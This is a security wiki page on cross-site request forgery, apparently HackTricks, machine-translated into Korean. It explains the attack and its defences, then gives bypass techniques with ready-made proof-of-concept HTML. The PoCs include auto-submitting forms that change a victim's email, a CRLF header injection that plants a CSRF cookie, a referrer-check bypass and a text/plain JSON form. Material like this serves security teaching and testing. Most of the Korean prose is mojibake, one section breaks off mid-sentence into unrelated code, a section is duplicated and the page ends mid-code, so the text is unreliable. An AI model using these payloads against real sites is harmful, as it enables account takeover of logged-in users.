# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)**ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°ì—ì„œ **@carlospolopm**ì„ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ìˆëŠ” í•´ì»¤ì™€ ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ì™€ ì†Œí†µí•˜ê¸° ìœ„í•´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ì°¸ì—¬í•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°ë ¥**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì„ ë‹¤ë£¨ëŠ” ì½˜í…ì¸ ì™€ ìƒí˜¸ ì‘ìš©í•˜ì„¸ìš”.

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ë¥¼ ë”°ë¼ê°€ì„¸ìš”.

**ìµœì‹  ê³µì§€ì‚¬í•­**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•´ ìµœì‹  ì •ë³´ë¥¼ ë°›ì•„ë³´ì„¸ìš”.

**[Discord](https://discord.com/invite/N3FrSbmwdy)**ì— ì°¸ì—¬í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!


## CSRF (Cross-Site Request Forgery) ì„¤ëª…

**CSRF (Cross-Site Request Forgery)**ëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°œê²¬ë˜ëŠ” ë³´ì•ˆ ì·¨ì•½ì  ìœ í˜•ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ê³µê²©ìëŠ” ì¸ì¦ëœ ì„¸ì…˜ì„ ì´ìš©í•´ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ì‚¬ìš©ì ëŒ€ì‹  ë™ì‘ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ì€ í”¼í•´ìì˜ í”Œë«í¼ì— ë¡œê·¸ì¸í•œ ì‚¬ìš©ìê°€ ì•…ì„± ì‚¬ì´íŠ¸ë¥¼ ë°©ë¬¸í•  ë•Œ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ ì‚¬ì´íŠ¸ëŠ” ìë°”ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰, í¼ ì œì¶œ ë˜ëŠ” ì´ë¯¸ì§€ ê°€ì ¸ì˜¤ê¸°ì™€ ê°™ì€ ë°©ë²•ì„ í†µí•´ í”¼í•´ìì˜ ê³„ì •ìœ¼ë¡œ ìš”ì²­ì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤.

### CSRF ê³µê²©ì„ ìœ„í•œ ì‚¬ì „ ì¡°ê±´
CSRF ì·¨ì•½ì ì„ ì´ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒ ì¡°ê±´ë“¤ì´ ì¶©ì¡±ë˜ì–´ì•¼ í•©ë‹ˆë‹¤:

1. **ê°€ì¹˜ ìˆëŠ” ë™ì‘ ì‹ë³„**: ê³µê²©ìëŠ” ë¹„ë°€ë²ˆí˜¸ ë³€ê²½, ì´ë©”ì¼ ë³€ê²½ ë˜ëŠ” ê¶Œí•œ ìƒìŠ¹ê³¼ ê°™ì´ ì´ìš©í•  ê°€ì¹˜ ìˆëŠ” ë™ì‘ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.
2. **ì„¸ì…˜ ê´€ë¦¬**: ì‚¬ìš©ìì˜ ì„¸ì…˜ì€ ì¿ í‚¤ë‚˜ HTTP ê¸°ë³¸ ì¸ì¦ í—¤ë”ë¥¼ í†µí•´ ê´€ë¦¬ë˜ì–´ì•¼ í•˜ë©°, ë‹¤ë¥¸ í—¤ë”ëŠ” ì´ë¥¼ ìœ„í•´ ì¡°ì‘ë  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
3. **ì˜ˆì¸¡í•  ìˆ˜ ì—†ëŠ” ë§¤ê°œë³€ìˆ˜ì˜ ë¶€ì¬**: ìš”ì²­ì— ì˜ˆì¸¡í•  ìˆ˜ ì—†ëŠ” ë§¤ê°œë³€ìˆ˜ê°€ í¬í•¨ë˜ì–´ì„œëŠ” ì•ˆ ë˜ë©°, ì´ëŠ” ê³µê²©ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### CSRFì— ëŒ€í•œ ë°©ì–´
CSRF ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ëŒ€ì‘ì±…ì„ ì ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* [**SameSite ì¿ í‚¤**](hacking-with-cookies/#samesite): ì´ ì†ì„±ì€ ë¸Œë¼ìš°ì €ê°€ êµì°¨ ì‚¬ì´íŠ¸ ìš”ì²­ê³¼ í•¨ê»˜ ì¿ í‚¤ë¥¼ ë³´ë‚´ì§€ ëª»í•˜ë„ë¡ ë§‰ìŠµë‹ˆë‹¤. [SameSite ì¿ í‚¤ì— ëŒ€í•´ ë” ì•Œì•„ë³´ê¸°](hacking-with-cookies/#samesite).
* [**Cross-origin resource sharing**](cors-bypass.md): í”¼í•´ ì‚¬ì´íŠ¸ì˜ CORS ì •ì±…ì€ ê³µê²©ì˜ ì‹¤í˜„ ê°€ëŠ¥ì„±ì— ì˜í–¥ì„ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ, ê³µê²©ì´ í”¼í•´ ì‚¬ì´íŠ¸ì˜ ì‘ë‹µì„ ì½ëŠ” ê²ƒì„ ìš”êµ¬í•˜ëŠ” ê²½ìš°ì…ë‹ˆë‹¤. [CORS ìš°íšŒì— ëŒ€í•´ ì•Œì•„ë³´ê¸°](cors-bypass.md).
* **ì‚¬ìš©ì í™•ì¸**: ì‚¬ìš©ìì˜ ì˜ë„ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìš”êµ¬í•˜ê±°ë‚˜ captchaë¥¼ í’€ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Referrer ë˜ëŠ” Origin í—¤ë” í™•ì¸**: ì´ëŸ¬í•œ í—¤ë”ë¥¼ í™•ì¸í•˜ì—¬ ìš”ì²­ì´ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì¶œì²˜ì—ì„œ ì˜¤ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ URLì˜ ì¡°ì‘ì„ í†µí•´ ì˜ëª» êµ¬í˜„ëœ ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì£¼ì˜í•´ì•¼ í•©ë‹ˆë‹¤:
- `http://mal.net?orig=http://example.com` (URLì´ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” URLë¡œ ëë‚¨)
- `http://example.com.mal.net` (URLì´ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” URLë¡œ ì‹œì‘í•¨)
* **ë§¤ê°œë³€ìˆ˜ ì´ë¦„ ìˆ˜ì •**: POST ë˜ëŠ” GET ìš”ì²­ì˜ ë§¤ê°œë³€ìˆ˜ ì´ë¦„ì„ ë³€ê²½í•˜ì—¬ ìë™í™”ëœ ê³µê²©ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **CSRF í† í°**: ê° ì„¸ì…˜ë§ˆë‹¤ ê³ ìœ í•œ CSRF í† í°ì„ í¬í•¨í•˜ê³  ì´ í† í°ì„ í›„ì† ìš”ì²­ì—ì„œ ìš”êµ¬í•¨ìœ¼ë¡œì¨ CSRFì˜ ìœ„í—˜ì„ í¬ê²Œ ì¤„ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. CORSë¥¼ ê°•ì œë¡œ ì ìš©í•¨ìœ¼ë¡œì¨ í† í°ì˜ íš¨ê³¼ë¥¼ í–¥ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ ë°©ì–´ì±…ì„ ì´í•´í•˜ê³  êµ¬í˜„í•˜ëŠ” ê²ƒì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë³´ì•ˆê³¼ ë¬´ê²°ì„±ì„ ìœ ì§€í•˜ëŠ” ë° ì¤‘ìš”í•©ë‹ˆë‹¤.

## ë°©ì–´ ìš°íšŒ

### POSTì—ì„œ GETìœ¼ë¡œ ë³€ê²½

ì•…ìš©í•˜ë ¤ëŠ” ì–‘ì‹ì´ CSRF í† í°ì„ ì‚¬ìš©í•˜ì—¬ **POST ìš”ì²­ì„ ë³´ë‚´ë„ë¡ ì¤€ë¹„**ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **GET**ë„ **ìœ íš¨í•œì§€** í™•ì¸í•˜ê³  GET ìš”ì²­ì„ ë³´ë‚¼ ë•Œ **CSRF í† í°ì´ ì—¬ì „íˆ ìœ íš¨ì„± ê²€ì‚¬**ë˜ëŠ”ì§€ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.

### í† í° ë¶€ì¬

ì‘ìš© í”„ë¡œê·¸ë¨ì€ í† í°ì´ ì¡´ì¬í•  ë•Œë§Œ í† í°ì„ **ê²€ì¦**í•˜ëŠ” ë©”ì»¤ë‹ˆì¦˜ì„ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ í† í°ì´ ì—†ì„ ë•Œ ê²€ì¦ì´ ì™„ì „íˆ ìƒëµë˜ëŠ” ê²½ìš° ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤. ê³µê²©ìëŠ” í† í°ì„ ì „ë‹¬í•˜ëŠ” ë§¤ê°œë³€ìˆ˜ë¿ë§Œ ì•„ë‹ˆë¼ ë§¤ê°œë³€ìˆ˜ ìì²´ë¥¼ **ì œê±°**í•¨ìœ¼ë¡œì¨ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê²€ì¦ í”„ë¡œì„¸ìŠ¤ë¥¼ ìš°íšŒí•˜ê³  CSRF ê³µê²©ì„ íš¨ê³¼ì ìœ¼ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### CSRF í† í°ì´ ì‚¬ìš©ì ì„¸ì…˜ì— ì—°ê²°ë˜ì§€ ì•ŠìŒ

CSRF í† í°ì„ ì‚¬ìš©ì ì„¸ì…˜ì— ì—°ê²°í•˜ì§€ ì•ŠëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì€ ì¤‘ëŒ€í•œ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì‹œìŠ¤í…œì€ ê° í† í°ì´ ì‹œì‘ ì„¸ì…˜ì— ë°”ì¸ë”©ë˜ëŠ” ëŒ€ì‹  ì „ì—­ í’€ì—ì„œ í† í°ì„ í™•ì¸í•©ë‹ˆë‹¤.

ê³µê²©ìê°€ ë‹¤ìŒê³¼ ê°™ì´ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. ìì‹ ì˜ ê³„ì •ì„ ì‚¬ìš©í•˜ì—¬ **ì¸ì¦**í•©ë‹ˆë‹¤.
2. ì „ì—­ í’€ì—ì„œ **ìœ íš¨í•œ CSRF í† í°**ì„ ì–»ìŠµë‹ˆë‹¤.
3. ì´ í† í°ì„ í”¼í•´ìì— ëŒ€í•œ CSRF ê³µê²©ì— ì‚¬ìš©í•©ë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì„ í†µí•´ ê³µê²©ìëŠ” í”¼í•´ìë¥¼ ëŒ€ì‹ í•˜ì—¬ ë¬´ë‹¨ ìš”ì²­ì„ ìˆ˜í–‰í•˜ë©°, ì‘ìš© í”„ë¡œê·¸ë¨ì˜ **ë¶€ì ì ˆí•œ í† í° ê²€ì¦ ë©”ì»¤ë‹ˆì¦˜**ì„ ì•…ìš©í•©ë‹ˆë‹¤.

### ë©”ì„œë“œ ìš°íšŒ

ìš”ì²­ì´ "**
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
ì°¸ê³ ë¡œ, **csrf í† í°ì´ ì„¸ì…˜ ì¿ í‚¤ì™€ ê´€ë ¨ë˜ì–´ ìˆë‹¤ë©´ ì´ ê³µê²©ì€ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ì™œëƒí•˜ë©´ í”¼í•´ìì—ê²Œ ì„¸ì…˜ì„ ì„¤ì •í•´ì•¼ í•˜ê¸° ë•Œë¬¸ì— ìì‹ ì— ëŒ€í•œ ê³µê²©ì„ í•˜ê²Œ ë  ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### Content-Type ë³€ê²½

[**ì—¬ê¸°**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)ì— ë”°ë¥´ë©´, **POST** ë©”ì†Œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ **preflight ìš”ì²­ì„ í”¼í•˜ê¸° ìœ„í•´** í—ˆìš©ë˜ëŠ” Content-Type ê°’ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

í•˜ì§€ë§Œ, **ì„œë²„ì˜ ë¡œì§ì€ Content-Typeì— ë”°ë¼ ë‹¤ë¥¼ ìˆ˜ ìˆìœ¼ë¯€ë¡œ** ì–¸ê¸‰ëœ ê°’ê³¼ **`application/json`**, **`text/xml`**, **`application/xml`**ê³¼ ê°™ì€ ë‹¤ë¥¸ ê°’ë“¤ì„ ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤.

ì˜ˆì‹œ (from [ì—¬ê¸°](https://brycec.me/posts/corctf\_2021\_challenges))ì—ì„œ JSON ë°ì´í„°ë¥¼ text/plainìœ¼ë¡œ ì „ì†¡í•˜ëŠ” ë°©ë²•:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### JSON ë°ì´í„°ì— ëŒ€í•œ Preflight ìš”ì²­ ìš°íšŒí•˜ê¸°

`Content-Type: application/json`ì„ ì‚¬ìš©í•˜ì—¬ POST ìš”ì²­ì„ í†µí•´ JSON ë°ì´í„°ë¥¼ ë³´ë‚´ë ¤ê³  í•  ë•Œ, HTML í¼ì—ì„œëŠ” ì§ì ‘ì ìœ¼ë¡œ ì‚¬ìš©í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ë§ˆì°¬ê°€ì§€ë¡œ, `XMLHttpRequest`ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ ì½˜í…ì¸  ìœ í˜•ì„ ë³´ë‚´ë©´ í”„ë¦¬í”Œë¼ì´íŠ¸ ìš”ì²­ì´ ì‹œì‘ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ Content-Typeê³¼ ê´€ê³„ì—†ì´ ì„œë²„ê°€ JSON ë°ì´í„°ë¥¼ ì²˜ë¦¬í•˜ëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ ì´ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ì „ëµì´ ìˆìŠµë‹ˆë‹¤:

1. **ëŒ€ì²´ ì½˜í…ì¸  ìœ í˜• ì‚¬ìš©**: í¼ì—ì„œ `enctype="text/plain"`ì„ ì„¤ì •í•˜ì—¬ `Content-Type: text/plain` ë˜ëŠ” `Content-Type: application/x-www-form-urlencoded`ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ ë°±ì—”ë“œê°€ Content-Typeê³¼ ê´€ê³„ì—†ì´ ë°ì´í„°ë¥¼ ì‚¬ìš©í•˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸í•©ë‹ˆë‹¤.

2. **ì½˜í…ì¸  ìœ í˜• ìˆ˜ì •**: í”„ë¦¬í”Œë¼ì´íŠ¸ ìš”ì²­ì„ í”¼í•˜ë©´ì„œ ì„œë²„ê°€ ì½˜í…ì¸ ë¥¼ JSONìœ¼ë¡œ ì¸ì‹í•˜ë„ë¡ í•˜ë ¤ë©´, `Content-Type: text/plain; application/json`ìœ¼ë¡œ ë°ì´í„°ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” í”„ë¦¬í”Œë¼ì´íŠ¸ ìš”ì²­ì„ íŠ¸ë¦¬ê±°í•˜ì§€ ì•Šì§€ë§Œ, ì„œë²„ê°€ `application/json`ì„ ìˆ˜ë½í•˜ë„ë¡ êµ¬ì„±ë˜ì–´ ìˆë‹¤ë©´ ì˜¬ë°”ë¥´ê²Œ ì²˜ë¦¬ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

3. **SWF í”Œë˜ì‹œ íŒŒì¼ í™œìš©**: ëœ ì¼ë°˜ì ì´ì§€ë§Œ ì‹¤í–‰ ê°€ëŠ¥í•œ ë°©ë²•ìœ¼ë¡œ, SWF í”Œë˜ì‹œ íŒŒì¼ì„ ì‚¬ìš©í•˜ì—¬ ì´ëŸ¬í•œ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê¸°ìˆ ì— ëŒ€í•œ ìì„¸í•œ ì´í•´ë¥¼ ìœ„í•´ [ì´ ê²Œì‹œë¬¼](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.

### Referrer / Origin ê²€ì‚¬ ìš°íšŒ

**Referrer í—¤ë” íšŒí”¼**

ì‘ìš© í”„ë¡œê·¸ë¨ì€ 'Referer' í—¤ë”ê°€ ìˆëŠ” ê²½ìš°ì—ë§Œ ìœ íš¨ì„±ì„ ê²€ì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¸Œë¼ìš°ì €ê°€ ì´ í—¤ë”ë¥¼ ë³´ë‚´ì§€ ì•Šë„ë¡ í•˜ë ¤ë©´ ë‹¤ìŒ HTML ë©”íƒ€ íƒœê·¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```xml
<meta name="referrer" content="never">
```
ì´ë ‡ê²Œ í•˜ë©´ 'Referer' í—¤ë”ê°€ ìƒëµë˜ì–´ ì¼ë¶€ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì •ê·œì‹ ìš°íšŒ**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Referrerê°€ ë§¤ê°œë³€ìˆ˜ ë‚´ì—ì„œ ë³´ë‚¼ URLì— ì„œë²„ì˜ ë„ë©”ì¸ ì´ë¦„ì„ ì„¤ì •í•˜ë ¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEAD ë©”ì„œë“œ ìš°íšŒ**

[**ì´ CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)ì˜ ì²« ë²ˆì§¸ ë¶€ë¶„ì—ì„œëŠ” [Oakì˜ ì†ŒìŠ¤ ì½”ë“œ](https://github.com/oakserver/oak/blob/main/router.ts#L281)ì—ì„œ ë¼ìš°í„°ê°€ **ì‘ë‹µ ë³¸ë¬¸ì´ ì—†ëŠ” GET ìš”ì²­ìœ¼ë¡œ HEAD ìš”ì²­ì„ ì²˜ë¦¬**í•˜ë„ë¡ ì„¤ì •ë˜ì–´ ìˆë‹¤ê³  ì„¤ëª…í•©ë‹ˆë‹¤. ì´ëŠ” Oakì—ë§Œ í•´ë‹¹ë˜ëŠ” ë…íŠ¹í•œ í•´ê²°ì±…ì€ ì•„ë‹ˆë©°, HEAD ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ” íŠ¹ì • í•¸ë“¤ëŸ¬ ëŒ€ì‹  GET í•¸ë“¤ëŸ¬ì—ê²Œ ì „ë‹¬ë˜ì§€ë§Œ ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œëŠ” ì‘ë‹µ ë³¸ë¬¸ì„ ì œê±°í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ GET ìš”ì²­ì´ ì œí•œë˜ëŠ” ê²½ìš°, **GET ìš”ì²­ìœ¼ë¡œ ì²˜ë¦¬ë˜ëŠ” HEAD ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜** ìˆìŠµë‹ˆë‹¤.

## **Exploit ì˜ˆì‹œ**

### **CSRF í† í° ìœ ì¶œ**

**CSRF í† í°**ì´ **ë°©ì–´**ë¡œ ì‚¬ìš©ë˜ëŠ” ê²½ìš°, [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ì·¨ì•½ì ì´ë‚˜ [**Dangling Markup**](dangling-markup-html-scriptless-injection/) ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ **ìœ ì¶œ**ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **HTML íƒœê·¸ë¥¼ ì‚¬ìš©í•œ GET**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
ë‹¤ë¥¸ HTML5 íƒœê·¸ ì¤‘ ìë™ìœ¼ë¡œ GET ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆëŠ” íƒœê·¸ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Form GET ìš”ì²­

When a form uses the GET method, the form data is appended to the URL as query parameters. This means that the data is visible in the URL and can be easily manipulated by an attacker.

GET requests are typically used for retrieving data from the server and should not have any side effects. However, if a vulnerable application performs sensitive actions based on GET requests, it can be susceptible to CSRF attacks.

To exploit a CSRF vulnerability in a form GET request, an attacker can create a malicious webpage that includes an HTML form with the target URL as the form's action. The attacker can then trick the victim into visiting the malicious webpage, causing the victim's browser to automatically submit the form and perform the undesired action.

To prevent CSRF attacks in form GET requests, it is recommended to use the POST method instead. Additionally, implementing anti-CSRF tokens can provide an extra layer of protection by validating that the request originated from a trusted source.

### Form GET ìš”ì²­

í¼ì´ GET ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°, í¼ ë°ì´í„°ëŠ” ì¿¼ë¦¬ ë§¤ê°œë³€ìˆ˜ë¡œ URLì— ì¶”ê°€ë©ë‹ˆë‹¤. ì´ëŠ” ë°ì´í„°ê°€ URLì— í‘œì‹œë˜ì–´ ê³µê²©ìê°€ ì‰½ê²Œ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

GET ìš”ì²­ì€ ì¼ë°˜ì ìœ¼ë¡œ ì„œë²„ì—ì„œ ë°ì´í„°ë¥¼ ê²€ìƒ‰í•˜ëŠ” ë° ì‚¬ìš©ë˜ë©° ë¶€ì‘ìš©ì´ ì—†ì–´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì·¨ì•½í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ GET ìš”ì²­ì„ ê¸°ë°˜ìœ¼ë¡œ ë¯¼ê°í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ CSRF ê³µê²©ì— ì·¨ì•½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í¼ GET ìš”ì²­ì—ì„œ CSRF ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ ê³µê²©ìëŠ” ëŒ€ìƒ URLì„ í¼ì˜ ì•¡ì…˜ìœ¼ë¡œ í¬í•¨í•˜ëŠ” ì•…ì„± ì›¹ í˜ì´ì§€ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ê³µê²©ìëŠ” í”¼í•´ìë¥¼ ì†ì—¬ ì•…ì„± ì›¹ í˜ì´ì§€ë¥¼ ë°©ë¬¸í•˜ê²Œ í•˜ì—¬ í”¼í•´ìì˜ ë¸Œë¼ìš°ì €ê°€ ìë™ìœ¼ë¡œ í¼ì„ ì œì¶œí•˜ê³  ì›í•˜ì§€ ì•ŠëŠ” ì‘ì—…ì„ ìˆ˜í–‰í•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í¼ GET ìš”ì²­ì—ì„œ CSRF ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ POST ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ë˜í•œ, ì•ˆí‹° CSRF í† í°ì„ êµ¬í˜„í•˜ì—¬ ìš”ì²­ì´ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì¶œì²˜ì—ì„œ ìœ ë˜ë˜ì—ˆëŠ”ì§€ë¥¼ í™•ì¸í•¨ìœ¼ë¡œì¨ ì¶”ê°€ì ì¸ ë³´í˜¸ ê¸°ëŠ¥ì„ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
